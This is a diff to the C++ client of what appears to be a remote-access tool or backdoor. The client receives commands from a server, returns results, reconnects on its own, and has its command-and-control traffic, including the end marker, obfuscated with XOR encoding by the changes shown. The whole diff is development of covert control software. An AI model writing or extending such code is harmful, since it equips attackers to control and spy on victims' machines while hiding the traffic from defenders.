@@ -62,8 +62,10 @@ int Connexion::main(bool is_admin, string path_prog)
         //command.append(buffer,len_recv); 
         cout << "IN main client " << endl;
         Sleep(1000);
-        recvSafe(command,i);
         
+        command = recvSafe(i);
+        command = XOREncryption(command); 
+
         cout << "command in main ---->" << command <<"<------------"<<endl;
         cout << "command in main ---->" << command.length() <<"<------------"<<endl;
 
@@ -149,6 +151,7 @@ int Connexion::main(bool is_admin, string path_prog)
                 else
                 {result += getPath();}
                 
+                result = XOREncryption(result);
                 sendSafe(result);
                 
             }
@@ -162,9 +165,10 @@ int Connexion::main(bool is_admin, string path_prog)
         //////cout << "erase ok !" <<endl;
     return 0;
 }
-void Connexion::recvSafe(string &command,int i)
+string Connexion::recvSafe(int i)
 {//allows you to receive data while managing errors 
     char buffer[BUFFER_LEN];
+    string result;
     int len_recv=recv(sock_client,buffer,sizeof(buffer),0);
     cout << "len recv: " << len_recv << endl;
     cout << "BUFFER: " << buffer << endl;
@@ -179,20 +183,20 @@ void Connexion::recvSafe(string &command,int i)
     }
     else
     {
-        string tmp = buffer;
-        command = XORData(tmp);
-        cout << "COmmand: " << command << endl;
+        result = buffer;
+        cout << "COmmand: " << result << endl;
         //command.append(XORData);
         
-        if(command.empty())
+        if(result.empty())
         {
             //If command empty re connect to server.
             cout << "[--]empty go to reconnect" <<endl;
             //system("PAUSE");
             reConnect();
         }
-        
+    
     }
+    return result;
 }
 
 
@@ -204,6 +208,8 @@ Once the function is finished send "\r\n" to signal to the server that the clien
     int len_data = data.length();
     float nb_d_envoi =  float(len_data)  / float(BUFFER_LEN);
     int i=0;
+
+    string end = "\r\n"; //END CONNECTION.
 
     cout << nb_d_envoi << endl;
     if(len_data > BUFFER_LEN)
@@ -221,31 +227,37 @@ Once the function is finished send "\r\n" to signal to the server that the clien
             if(i == 0)
             {
                 //cout <<i <<": ----------> " << data.substr(0,BUFFER_LEN);
-                iResult=send(sock_client, data.substr(0,BUFFER_LEN).c_str(), BUFFER_LEN, 0);
+                cout << "send one request" << endl;
+                cout << "before xor: " << data.substr(0,BUFFER_LEN) << endl;
+                cout << "After xor: " <<  XOREncryption(data.substr(0,BUFFER_LEN)) << endl;
+
+                iResult=send(sock_client, XOREncryption(data.substr(0,BUFFER_LEN)).c_str(), BUFFER_LEN, 0);
                 checkSend(iResult);
             }
             else
             {
-                iResult=send(sock_client, data.substr(BUFFER_LEN*i , BUFFER_LEN*(i+1)).c_str(),BUFFER_LEN, 0);
+                iResult=send(sock_client, XOREncryption(data.substr(BUFFER_LEN*i , BUFFER_LEN*(i+1))).c_str(),BUFFER_LEN, 0);
                 checkSend(iResult);
             }
             if(int(nb_d_envoi)==i && is_modulo == false) //#!
             {
                 cout << "no modulo:" << endl;
                 cout << data.length() << endl;
-                iResult=send(sock_client, data.substr(BUFFER_LEN*i).c_str(), strlen(data.substr(BUFFER_LEN*i).c_str()), 0);
+                iResult=send(sock_client, XOREncryption(data.substr(BUFFER_LEN*i)).c_str(), strlen(data.substr(BUFFER_LEN*i).c_str()), 0);
                 checkSend(iResult);
             }
         }
     }
     else
     {
-        iResult = send(sock_client, data.c_str(), strlen(data.c_str()),0);
+        iResult = send(sock_client, XOREncryption(data).c_str(), strlen(data.c_str()),0);
         checkSend(iResult);
     }
     
     cout << "NB request: " << i << endl;
-    iResult=send(sock_client,"\r\n",2,0); // send end communication.
+
+    iResult=send(sock_client,XOREncryption(end).c_str(),2,0); // send end communication.
+    cout <<"STOP SEND" << endl;
     checkSend(iResult);
    
     ////cout << "send ok " <<endl;
